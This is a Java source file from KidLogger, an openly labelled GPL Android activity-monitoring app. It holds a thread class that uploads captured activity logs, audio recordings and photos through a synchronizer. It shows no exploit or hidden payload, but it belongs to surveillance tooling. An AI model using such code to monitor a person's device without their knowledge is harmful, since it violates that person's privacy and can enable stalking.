/**********************************************************************
** Copyright (C) 2005-2011 Tesline-Service S.R.L.  All rights reserved.
**
** KidLogger - user activity monitoring software.
** 
**
** This file may be distributed and/or modified under the terms of the
** GNU General Public License version 2 as published by the Free Software
** Foundation and appearing in the file LICENSE.GPL included in the
** packaging of this file.
**
** This file is provided AS IS with NO WARRANTY OF ANY KIND, INCLUDING THE
** WARRANTY OF DESIGN, MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.
**
** See http://www.kidlogger.net for GPL licensing information and terms of service
**
** Contact help@kidlogger.net if any conditions of this licensing are
** not clear to you.
**
**********************************************************************/
package net.kidlogger.kidlogger;

//import android.util.Log;
import java.io.File;

public class SendThread implements Runnable {
	private KLService.Synchronizer s;
	private String fileType;
	private File f;
	protected Thread thread;
	
		
	public SendThread(KLService.Synchronizer s, File f, String fileType){
		this.s = s;
		this.f = f;
		this.fileType = fileType;
		thread = new Thread(this);
		thread.start();
	}
	
	public void run(){
		//Log.i("SendThread", "start thread: " + file);
		if(fileType.equals(".htm"))		
			//s.sendLog(f, fileType);
			s.sendLog(f, new String(fileType));
		else if(fileType.equals("audio/3gpp"))
			s.sendRecord(f);
		else if(fileType.equals("image/jpeg"))
			//s.sendPhoto(f, fileType);
			s.sendPhoto(f, new String(fileType));
		//Log.i("SendThread", "finish thread: " + file);
	}
}
